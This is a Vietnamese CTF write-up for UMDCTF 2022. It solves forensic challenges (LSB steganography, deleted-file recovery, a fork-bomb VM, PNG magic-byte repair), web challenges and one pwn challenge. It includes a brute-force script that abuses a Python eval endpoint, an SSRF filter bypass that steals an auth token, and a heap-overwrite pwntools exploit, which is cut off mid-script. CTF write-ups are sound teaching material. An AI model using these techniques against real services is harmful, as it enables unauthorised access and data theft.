# Write-up UMDCTF 2022

| Challenge type                                             | 
| ------------------------------------------------------------ | 
| [WEB](#Web) | 
| [PWNABLE](#Pwn) | 
| [REVERSE](#Reverse) | |
| [CRYPTOGRAPHY](#Crypto) | 
| [FORENSIC](#Forensic) | 

## Forensic

> ### Blue 
#### Description
Larry gave me this python script and an image. What is she trying to tell me?  
File 1: [bluer.png](https://drive.google.com/file/d/1qOrd34ckztfl4arKI3vBUZJW54PDUCx1/view?usp=sharing)  
File 2: [steg.py](https://drive.google.com/file/d/1up2DX5-oZ52v3yRIXyqo8qgxe9eWCTGJ/view?usp=sharing)  

#### Solution

Challenge cho chúng ta 2 file : bluer.png

![bluer](https://user-images.githubusercontent.com/97369998/157352466-f4618f50-b9ad-418c-83d7-334c18477f03.png)

Và steg.py

```python
from PIL import Image
import random

filename = 'blue.png'
orig_image = Image.open(filename)
pixels = orig_image.load()
width, height = orig_image.size

with open('flag.txt', 'r') as f:
    flag = f.read().strip() 

for y in range(len(flag)):
    for a in range(ord(flag[y])):
        x = random.randrange(0,width-1) 
        c = random.randrange(0,3)
        pixel = list(orig_image.getpixel((x, y)))
        pixel[c] += 1
        pixels[x, y] = (pixel[0], pixel[1], pixel[2])

orig_image.save('bluer.png')
```
Cùng mình phân tích code một chút nào!

Đầu tiên họ gọi và mở 1 file png có tên là blue.png, sau đó sẽ load pixel của ảnh cùng với các kích thước width và height. Nội dung file flag.txt được gán vô biến flag.

Quá trình xử lý file blue.png được bắt đầu bằng vòng lặp cùng với các biến được random giá trị. Nhìn qua chúng ta có thể nhận ra việc tác giả đã sử dụng phương pháp LSB (tham khảo thêm tại https://m00n19.wordpress.com/2022/03/03/20/) để chỉnh sửa ảnh gốc.

Với mỗi một hàng pixel của ảnh gốc được chỉnh sửa ngẫu nhiên một giá trị R,G hoặc B thuộc một pixel bất kỳ. Vì vậy mấu chốt của challenge này là việc chúng ta sẽ phải tính được số lần các pixel bị thay đổi, số hàng pixel bị can thiệp để có thể biết được độ dài flag cũng như convert được các giá trị int đại diện cho từng chữ cái trong flag.

Mình có chạy thử code sau để xem thử một vài giá trị pixel của file bluer.png đã chỉnh sửa

```python
from PIL import Image
import random

filename = 'bluer.png'
orig_image = Image.open(filename)
pixels = orig_image.load()
width, height = orig_image.size

flag_number = []

for y in range(height):
    x = random.randrange(0,width-1) 
    pixel = list(orig_image.getpixel((x, y)))
    print(pixel)
```
Kết quả cho mình thấy nghi ngờ về giá trị các pixel của file ảnh cũ chưa chỉnh sửa

```console
$ python flag.py 
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 167, 255]
[34, 87, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 87, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
[34, 86, 166, 255]
....
[34, 86, 166, 255]
```
Chúng ta có thể thấy một vài pixel có sự khác biệt về giá trị R,G hoặc B. Tuy nhiên có rất nhiều pixel đều có 1 giá trị (R,G,B) giống nhau là (34,86,166). Nghi vấn của mình đây có thể là giá trị gốc ban đầu các pixel của blue.png

Nếu cho tất cả các giá trị pixel của bluer.png giảm đi một bộ giá trị (34,86,166) thì hoàn toàn có thể trích xuất ra số lượt pixel bị thay đổi vì mỗi lần chỉ tăng 1 đơn vị.

```python
from PIL import Image
import random

filename = 'bluer.png'
orig_image = Image.open(filename)
pixels = orig_image.load()
width, height = orig_image.size

flag_number = []

for y in range(height):
    k = 0
    for x in range(width):
        k += orig_image.getpixel((x, y))[0] + orig_image.getpixel((x, y))[1] + orig_image.getpixel((x, y))[2] - (34+86+166)
      
    flag_number.append(k)

print(flag_number)

flag = []

for n in flag_number:
    if n != 0:
        flag.append(chr(n))

print(''.join(flag))
```

Mình code sử dụng ngược lại file bluer.png. Mục đích là sẽ quét từng pixel một trong ảnh để giảm một lượng giá trị (34,86,166) để có thể lấy được số lần thực hiện thay đổi pixel của từng hàng. Và kết quả thu được :

```console
$ python flag.py
[85, 77, 68, 67, 84, 70, 123, 76, 52, 114, 114, 121, 95, 76, 48, 118, 51, 115, 95, 104, 51, 114, 95, 115, 116, 51, 103, 48, 110, 111, 103, 114, 64, 112, 104, 121, 95, 56, 57, 51, 50, 48, 125, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
UMDCTF{L4rry_L0v3s_h3r_st3g0nogr@phy_89320}
```

Các giá trị 0 là do tác giả chỉ thực hiện thay đổi pixel trên các hàng có trị số không vượt quá độ dài flag nên trừ đi giá trị ban đầu thì dĩ nhiên bằng 0 rồi nhỉ!

`Flag: UMDCTF{L4rry_L0v3s_h3r_st3g0nogr@phy_89320}`

> ### Renzik's Case

#### Description

My friend deleted important documents off of my flash drive, can you help me find them?

Note: The flag can be submitted with or without the hiphen ex. UMDCTF-{flag} or UMDCTF{}

https://drive.google.com/file/d/1VmUyHJqU11E0UE7OYTPYV3U2yVh2qL5g/view?usp=sharing

#### Solution

Giải nén file tải về ta được 1 file image usb.img. Đây là một dạng liên quan đến disk forensics và mình vẫn luôn sử dụng một công cụ “the first” quen thuộc là AutoPsy.

Các bạn có thể tham khảo cách mount 1 file image bằng AutoPsy ở đây : https://networkdefensesolutions.com/index.php/forensics/103-loading-images-and-file-recovery-with-autopsy-part-2

Theo phần mô tả thì một file quan trọng đã bị xoá, công việc của mình là tìm lại file đó và mình dám chắc nó sẽ liên quan đến flag cuối cùng

![1](https://user-images.githubusercontent.com/97369998/157352219-77c13e3e-2936-4392-9868-3837e82356bd.png)<br>

Sau khi upload file vào AutoPsy, chúng ta có thể thấy ngay mục Deleted Files, cùng vào lục lọi xem có gì trong đó không nhé!

![2](https://user-images.githubusercontent.com/97369998/157352222-b8e8aa13-e803-4d90-9522-cbc1827b9641.png)<br>

Sau khi lục một vài file bị xoá, thì mình cũng tìm được flag :
#### **FLAG >>** `UMDCTF-{Sn00p1N9_L1K3_4_Sl317h!}`

Rất may mắn vì các file bị đánh dấu đã xóa, tuy nhiên nó chưa bị ghi đè dữ liệu mới lên nên vẫn có thể phục hồi được!

Một hướng tiếp cận thêm cho bài này bằng cách sử dụng công cụ “foremost” – một chương trình khôi phục dữ liệu forensics dành cho Linux.

Mọi người có thể tìm hiểu thêm cách sử dụng tại : https://www.kali.org/tools/foremost/

![3](https://user-images.githubusercontent.com/97369998/157352225-010303a9-1e20-4d71-9424-7f560acbf945.png)<br>

Và khi mở output/png chúng ta cũng tìm thấy flag

![4](https://user-images.githubusercontent.com/97369998/157352227-6ca07bfd-5a7e-4a4b-b1b8-b5da9e569885.png)<br>
`Flag: UMDCTF-{Sn00p1N9_L1K3_4_Sl317h!}`

> ### Class Project
#### Description: 
>I was working on a project for my C programming class and I broke my VM when trying to compile my code! My project is due at 11:59. Can you please help me get my VM up and running again?<br>
>VM Password: 1_w1ll_n07_br34k_7h15
>
><br>Download file: https://drive.google.com/drive/folders/1gE4Idj6DjhJ3AX64tOL3Tp31k8gurj94?usp=sharing
><br>Author: amanthanvi<br>
>Solves: 29/553

#### Solver:
Đề bài cho các file máy ảo <br>
![image](https://user-images.githubusercontent.com/75996090/157261256-ce499ba2-9f3a-4095-a4cd-61b9305f61a8.png)
<br>Import vào VMware và đăng nhập với mật khẩu đề cho. Tuy nhiên bạn có thể thấy sau khi đăng nhập khoảng 10s thôi là máy bắt đầu đơ. 
<br>Lý do là vì có một fork bomb trong autostart. Nó là một kiểu tấn công từ chối dịch vụ (DoS) trong đó fork system call được sử dụng một cách đệ quy cho đến khi tất cả tài nguyên hệ thống thực thi một lệnh khiến hệ thống cuối cùng trở nên quá tải và tê liệt, không thể phản hồi bất kỳ đầu vào nào.
<br>Vì vậy ý tưởng ở đây là phải khởi động trực tiếp tới root bằng cách chỉnh sửa grub command line để khám phá hệ thống tệp ([tham khảo](https://frameboxxindore.com/android/how-do-i-boot-ubuntu-as-root.html))
<br>Tuy nhiên k hiểu vì một lý do gì đó mà mình ko làm được nên mình làm hơi khác đi một chút
#### Tiến hành khởi động lại máy ảo. Trong khi BOOT đang load thì nhanh chóng ấn Shift. Màn hình sẽ hiển thị menu GNU GRUB
<br>![image](https://user-images.githubusercontent.com/75996090/157273651-96ebe5f9-68b3-4108-a6db-0349996391eb.png)
#### Ấn `c` để mở grub command line
![image](https://user-images.githubusercontent.com/75996090/157277179-c17e69f3-ab39-411f-a8f9-778a91d8650e.png)
#### Giờ chỉ việc cd tới các phân vùng và các tệp để tìm flag thôi
![image](https://user-images.githubusercontent.com/75996090/157277505-fe6e5c1b-c3db-4e25-9771-e238e9e2d8e8.png)
#### Flag được để trong file `(hd0,msdos5)/home/aman_esc/Documents/admin_notes` và trong cùng thư mục thì còn có file `fork_bomb.bash`, nguyên nhân khiến máy tính bị đơ
![FLAG ne](https://user-images.githubusercontent.com/75996090/157278339-40c9c6c0-4a8f-4632-bff4-3706039cbbbc.png)

`Flag: UMDCTF{f0rk_b0mb5_4r3_4_b4d_71m3}`

> ### Magic Plagueis the Wise
#### Description: 
>Did you ever hear the tragedy of Darth Plagueis The Wise? It's written here in a magical way, but I can't figure out how to read it. Can you help me?
><br>Download file: https://drive.google.com/file/d/1Yq5ckdzTmoUEnsyLzMJYTKLdz7JEw_ve/view?usp=sharing
><br>Author: matlac<br>
>Solves: 71/553

#### Solver:
#### Đề bài cho ta một file zip bên trong có 4464 file không có phần mở rộng (nhìn lượng file khá choáng :3)<br><br>![image](https://user-images.githubusercontent.com/75996090/157237826-f156f2ff-100c-4500-afb2-d1c528eb528a.png)
#### Kiểm tra loại tệp bằng `file` cũng không giúp ích được gì vì phần Magic byte đã bị sửa đổi
```
$ file 1
1: data
```
#### Dùng `hexedit` để kiểm tra mình thấy tất cả các file đều là file PNG nhưng đều bị sai magic byte đầu tiên 
```
$ hexedit 1
00000000   44 50 4E 47  0D 0A 1A 0A  00 00 00 0D  49 48 44 52  00 00 03 20  00 00 01 C1  DPNG........IHDR... ....
00000018   08 06 00 00  00 91 F7 DF  66 00 00 20  00 49 44 41  54 78 5E EC  5D 09 FC 56  ........f.. .IDATx^.]..V
00000030   C3 FA FF 0E  45 B6 12 11  8A 28 91 9D  2C 37 72 ED  4B B6 C8 1A  3F 72 2D 11  ....E....(..,7r.K...?r-.
00000048   D9 C9 52 96  4B B2 E5 22  44 64 F9 8B  08 91 5D AE  7D 89 AC B9  88 48 96 E8  ..R.K.."Dd....].}....H..
00000060   5E 25 22 B2  85 F9 7F BE  33 67 DE 33  E7 9C 39 67  CE BB FD 96  BC F3 B9 F7  ^%".....3g.3..9g........
00000078   A3 DF 7B 66  79 E6 99 ED  D9 1F 81 5A  A9 61 A0 86  81 1A 06 6A  18 A8 61 A0  ..{fy......Z.a.....j..a.
00000090   86 81 1A 06  6A 18 A8 61  A0 86 81 1A  06 EA 09 03  02 80 AC A7  B1 4A 1A 46  ....j..a.............J.F
```
```
$ hexedit 2
00000000   69 50 4E 47  0D 0A 1A 0A  00 00 00 0D  49 48 44 52  00 00 03 20  00 00 01 C1  iPNG........IHDR... ....
00000018   08 06 00 00  00 91 F7 DF  66 00 00 20  00 49 44 41  54 78 5E EC  5D 09 FC 56  ........f.. .IDATx^.]..V
00000030   C3 FA FF 0E  45 B6 12 11  8A 28 91 9D  2C 37 72 ED  4B B6 C8 1A  3F 72 2D 11  ....E....(..,7r.K...?r-.
00000048   D9 C9 52 96  4B B2 E5 22  44 64 F9 8B  08 91 5D AE  7D 89 AC B9  88 48 96 E8  ..R.K.."Dd....].}....H..
00000060   5E 25 22 B2  85 F9 7F BE  33 67 DE 33  E7 9C 39 67  CE BB FD 96  BC F3 B9 F7  ^%".....3g.3..9g........
00000078   A3 DF 7B 66  79 E6 99 ED  D9 1F 81 5A  A9 61 A0 86  81 1A 06 6A  18 A8 61 A0  ..{fy......Z.a.....j..a.
00000090   86 81 1A 06  6A 18 A8 61  A0 86 81 1A  06 EA 09 03  02 80 AC A7  B1 4A 1A 46  ....j..a.............J.F
```
#### Kiểm tra lại bằng cmp để chắc chắn là chỉ có 1 byte khác nhau
```
$ cmp -bl 1 2
1 104 D    151 i
```
#### Tiến hành sửa magic byte đầu tiên thành `89` giống magic byte chuẩn của file png và thêm `.png` vào đuôi file rồi mở lại
![1](https://user-images.githubusercontent.com/75996090/157239506-402c1a94-280e-469b-b0f7-ec89ca80d604.png)
#### Sau khi sửa file thứ 2 thứ 3 đều cho ra hình như trên thì suy nghĩ đầu tiên là phải làm cách nào đó để sửa tất cả các magic byte đầu tiên của ảnh để tìm ra ảnh duy nhất có flag trong số đó. 
#### Tuy nhiên cũng có một hoài nghi là tất cả các file có dung lượng như nhau vì thế khó có thể có một bức ảnh chứa flag mà cấu trúc và dung lượng bằng các file khác.
#### Vì vậy cần thay đổi hướng đi.
#### Đó là tách chỉ lấy các byte đầu tiên của từng file rồi gộp lại.
#### Viết một đoạn bash script và đây là kết quả<br>
![image](https://user-images.githubusercontent.com/75996090/157250450-a8ed25bb-ceec-4634-aadf-a087a40d6db2.png)

`Flag: UMDCTF{d4r7h_pl46u315_w45_m461c}`

## Web
> ### A Simple Calculator
Source code*: https://drive.google.com/file/d/1H-VvvdStKw6ReLB2BXHYw9Zu4YLb6qIy/view?usp=sharing

#### Review source code
```python
# .....
from secrets import flag_enc, ws
#....

def z(f: str):
    for w in ws:
        if w in f:
            raise Exception("nope")
    return True
# .....

@app.route('/calc', methods=['POST'])
def calc():
    val = 0
    try:
        z(request.json['f'])
        val = f"{int(eval(request.json['f']))}"
# .....
```
File `secrets.py` có chứa `flag_enc` và `ws` được import vào `app.py`. `ws` có chứa các blacklist keyword đã được dấu đi trước khi public source code. Server nhận f parameter đi qua hàm z, nếu trùng với blacklist thì sẽ trả về lỗi còn nếu không thì được đi vào `eval()`. 

Fuzz qua thì biết được hàm `ord()` và một số kí tự khác như `\` bị block nên không thể bypass hàm `z` hay đọc result dạng từng số ascii nên ta sẽ bruteforce `flag_enc` bằng cách cắt ra từng kí tự rồi so sánh từng cái thôi. 

**Python scripts**: Bruteforce encrypted flag
```python
import requests
import string

url = 'https://calculator-w78ar.ondigitalocean.app/'
characters = string.ascii_letters + string.digits + string.punctuation
# val = f"{int(eval(request.json['f']))}"

flag = ''
for i in range(len(flag), 100):
    for c in characters:
        json = {
            "f": f"flag_enc[{i}:{i+1}] == '{c}'"
        }

        r = requests.post(url+'calc', json=json)

        result = r.json()['result']
        print(flag+c)

        if result == '1':
            flag += c
            print('[FOUND] : ' + flag)

            if c == '}':
                exit('done!')
            break
```

**encrypted flag**: `OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}`

Flag nhận được đã bị encrypt bằng hàm `encrypt()` trong file `secrets.py`. 

**Python scripts**: Decrypt encrypted flag
```python
FLAG = 'OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}'

def encrypt(text: str, key: int):
    result = ''

    for c in text:
        if c.isupper():
            c_index = ord(c) - ord('A')
            c_shifted = (c_index + key) % 26 + ord('A')
            result += chr(c_shifted)
        elif c.islower():
            c_index = ord(c) - ord('a')
            c_shifted = (c_index + key) % 26 + ord('a')
            result += chr(c_shifted)
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c

    return result

def reverse(c, er):
    a = ord(c) - ord(er)
    if a >= key:
        result = a - key + ord(er)
    else:
        result = a + 26 - key + ord(er)
    return chr(result)

def decrypt(text: str, key: int):
    result = ''

    for c in text:
        if c.isupper():
            result += reverse(c, 'A')
        elif c.islower():
            result += reverse(c, 'a')
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c

    return result

def find_key():
    for i in range(100):
        if encrypt('UMDCTF', i) == 'OGXWNZ':
            return i

key = find_key()
print(f'[KEY FOUND] : ' + str(key))

flag_dec = decrypt(FLAG, key)
flag_enc = encrypt(flag_dec, key)

print(flag_dec)
print(flag_enc)
```

**Hoặc**:

![unknown](https://user-images.githubusercontent.com/71699412/157071772-df39177b-518b-483f-bb89-7c80adf4c797.png)

`Flag: UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}`

> ### Customer Support
Challenge có 1 nút Contact Us như sau:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-65.png?w=1024" alt="" class="wp-image-3839"/>   
Khi click vào thì nó cho ta 1 form như sau:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-66.png?w=1024" alt="" class="wp-image-3840"/>   
Thấy request được thực thi bởi /api/contact:   
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-67.png?w=1022" alt="" class="wp-image-3842"/>   
Ok và đó là tất cả những gì challenge này có thể làm từ phía bên ngoài, vì challenge này có cấp source code nên ta sẽ xem source xem có gì có thể exploit không:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-68.png?w=366" alt="" class="wp-image-3844"/>    
Challenge này có 1 đống file, sau khi lướt qua 1 lúc thì mình thấy ta sẽ dùng file api/auth.ts để có thể lấy được flag:  
```ts
if (req.method === 'GET') {
        const tok = getCookie('Authorization', {req, res});
        return res.status(200).json({ status: 'success', body: `${tok && tok == process.env.TOKEN ? process.env.FLAG : ''}`});
    }
```

Nếu cookie Authorization có giá trị bằng với process.env.TOKEN thì sẽ lấy được flag. Và ta có thể lấy được cái process.env.TOKEN thông qua file cái microservice. Trong microservice có 1 file là app.js có 2 route là /auth và /a24 đều sẽ trả về token:

```ts
authRouter.get('/auth', function(req, res, next) {
    return res.status(200).json(JSON.stringify({ token: process.env.TOKEN }));
});

authRouter.get('/a24', function(req, res, next) {
    return res.status(200).json(JSON.stringify({ token: process.env.TOKEN }));
});
```

Mà microservice chạy trên cổng 3001. Do đó ta phải SSRF để khiến server thực thi request đến http://localhost:3001. Và điều này có thể được thực hiện bởi /api/contact:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-69.png?w=947" alt="" class="wp-image-3848"/>   
Như ta thấy ở đây tham số POST message sẽ là đầu vào của SSRF. Và nó được xử lý bởi hàm c():
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-70.png?w=993" alt="" class="wp-image-3850"/>   
Hàm này sẽ filter input localhost, 127.0.0.1, 0.0.0.0 để ta không thể nào thực hiện request đến localhost:3001 được. Nhưng ta hãy để ý dòng code sau:   
```ts
t = u.hostname ? (await lookup(u.hostname)).address : `${process.env.MICROSERVICE}`;
```

Nếu hostname là null thì nó sẽ có giá trị là process.env.MICROSERVICE, và nó sẽ có giá trị là localhost:3001/a24. Vậy ta chỉ cần làm cho nó null là được, bằng cách dùng @:  
```ts
message=http://xxx@
```

Lấy được token:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-71.png?w=936" alt="" class="wp-image-3853"/>   
Nhưng khi gửi token này đến api/auth thì lại không được, mình thấy tác giả có hint là hình con gấu hay chó gì đó nên nghĩ đến Bearer, thêm Bearer ra đằng trước chuỗi JWT là được flag:    
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-72.png?w=957" alt="" class="wp-image-3855"/>   

## Pwn
> ### The show must go on  
#### Description

Đầu tiên ta kiểm tra qua thông tin của file

```Terminal
➜  checksec theshow
[*] '/home/hibana/Downloads/theshow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
➜  file theshow
theshow: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=9892240bcbf253bbd60b8484cf029b3fe7864338, not stripped
```

Sau đó chạy thử file

```Terminal
➜  ./theshow
Welcome to the comedy club!
We only have the best comedians here!Please help us set up for your act
What is the name of your act?
ba
Your act code is: Main_Act_Is_The_Best
How long do you want the show description to be?
12
Describe the show for us:
idk
What would you like to do?
+-------------+
|   Actions   |
|-------------|
| Perform Act |
| Switch Act  |
| End Show    |
+-------------|
Action:
```

Đầu tiên sẽ nhập một vài thông tin sau đó hiện ra 1 menu với 3 options: `Perform Act`, `Switch Act`, `End Show`
Với option 1 `Perform Act` thì sẽ tell joke sau dó kết thúc chương trình. Option2 `Switch Act` thì sau khi nhập một vài thông tin thì mình luôn bị trả về lỗi segmentation fault. Option3 thì kết thúc chương trình. Bây giờ cùng ngó qua source code để xem ta có thể khai thác được gì. Mình thấy có 1 số hàm như sau:

![function](https://raw.githubusercontent.com/h1bAna/writeup/main/UMDCTF2022/function.png) 

Ta thấy có hàm `win()` và `tellAjoke()` mình đoán để có flag thì cần phải làm `Perform Act` chạy hàm `win()` thay vì `tellAjoke()`
cùng xem chi tiết các hàm khác nhé:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rdx
  int result; // eax

  setbuf(stdout, 0LL, envp);
  setbuf(stdin, 0LL, v3);
  setbuf(stderr, 0LL, v4);
  setup();
  result = whatToDo();
  if ( result )
    return puts("The show is over, goodbye!");
  return result;
}
```

```C
__int64 setup()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  int v3; // r8d
  int v4; // r9d
  int v5; // edx
  int v6; // ecx
  int v7; // r8d
  int v8; // r9d
  int v9; // edx
  int v10; // ecx
  int v11; // r8d
  int v12; // r9d
  int v13; // edx
  int v14; // ecx
  int v15; // r8d
  int v16; // r9d
  int v17; // edx
  int v18; // ecx
  int v19; // r8d
  int v20; // r9d
  int v22; // [rsp+4h] [rbp-3Ch] BYREF
  __int64 v23; // [rsp+8h] [rbp-38h]
  char v24[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v25; // [rsp+38h] [rbp-8h]

  v25 = __readfsqword(0x28u);
  v22 = 0;
  message1 = malloc_set(80LL);
  message2 = malloc_set(96LL);
  message3 = malloc_set(128LL);
  v0 = message1;
  *(_QWORD *)message1 = 0x20656D6F636C6557LL;
  *(_QWORD *)(v0 + 8) = 0x6320656874206F74LL;
  *(_QWORD *)(v0 + 16) = 0x6C63207964656D6FLL;
  *(_DWORD *)(v0 + 24) = 169960053;
  v1 = message2;
  *(_QWORD *)message2 = 0x20796C6E6F206557LL;
  qmemcpy((void *)(v1 + 8), "have the best comedians here!", 29);
  v2 = message3;
  *(_QWORD *)message3 = 0x6820657361656C50LL;
  strcpy((char *)(v2 + 8), "elp us set up for your act\n");
  printf((unsigned int)"%s", message1, 1965061221, 1870209138, v3, v4);
  printf((unsigned int)"%s", message2, v5, v6, v7, v8);
  printf((unsigned int)"%s", message3, v9, v10, v11, v12);
  puts("What is the name of your act?");
  _isoc99_scanf((unsigned int)"%s", (unsigned int)v24, v13, v14, v15, v16);
  mainAct = malloc_set(104LL);
  j_strncpy_ifunc(mainAct, v24, 32LL);
  v23 = fcrypt("Main_Act_Is_The_Best", salt);
  j_strncpy_ifunc(mainAct + 32, v23, 64LL);
  puts("Your act code is: Main_Act_Is_The_Best");
  *(_QWORD *)(mainAct + 96) = tellAJoke;
  currentAct = mainAct;
  free(message1);
  free(message3);
  puts("How long do you want the show description to be?");
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v22, v17, v18, v19, v20);
  showDescription = malloc_set(v22 + 8);
  puts("Describe the show for us:");
  getchar();
  fgets(showDescription, 500LL, stdin);
  actList = mainAct;
  return 0LL;
}
```

```C
__int64 __fastcall whatToDo(__int64 a1, int a2)
{
  int v2; // edx
  int v3; // ecx
  int v4; // r8d
  int v5; // r9d
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v11; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v12; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v13; // [rsp+8h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  puts("What would you like to do?");
  v11 = 0;
  v12 = 0;
  puts("+-------------+");
  puts("|   Actions   |");
  puts("|-------------|");
  puts("| Perform Act |");
  puts("| Switch Act  |");
  puts("| End Show    |");
  puts("+-------------|");
  printf((unsigned int)"Action: ", a2, v2, v3, v4, v5);
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v11, v6, v7, v8, v9);
  switch ( v11 )
  {
    case 2:
      switchAct();
      puts("I think the current act switched switched. It might appear when we start up again...");
      break;
    case 3:
      return 1;
    case 1:
      (*(void (**)(void))(currentAct + 96))();
      break;
  }
  return v12;
}
```

OKE. Code khá là dài, mấy hàm ko quan trọng mình ko cho vào đây. Sau một hồi lâu ngồi đọc code, mình phát hiện chương trình `free(message3)` ngay sau đó `malloc_set(v22 + 8)` với v22 được người dùng nhập vào. Vì cơ chế free nên nếu ta nhập vào sao cho v22+8 = 128(size của mssage3) thì showDescription sẽ được trả về đúng địa chỉ của message3. Message3 nằm ngay trước `mainActor`. Thông qua việc gọi hàm `fgets(showDescription, 500LL, stdin);`, ta ghì đè từ showDescription đến `mainActor+96` ghì đè địa chỉ của hàm win vào. Khi đó, người dùng chọn `Perform Act` thì hàm `(*(void (**)(void))(currentAct + 96))()` sẽ được gọi. Ta sẽ có flag.

#### Exploit code

```python
#!python3
from pwn import *
#HOST 0.cloud.chals.io PORT 30138
p = remote('0.cloud.chals.io', 30138) #connect to server
print(p.recvuntil(b'act?')) # What is the name of your act?
p.sendline(b'quangba')
print(p.recvuntil(b'be?')) #How long do you want the show description to be? 120 + 8 = 128 = message3 size
p.sendline(b'120')
print(p.recvuntil(b'us:')) #Describe the show for us:
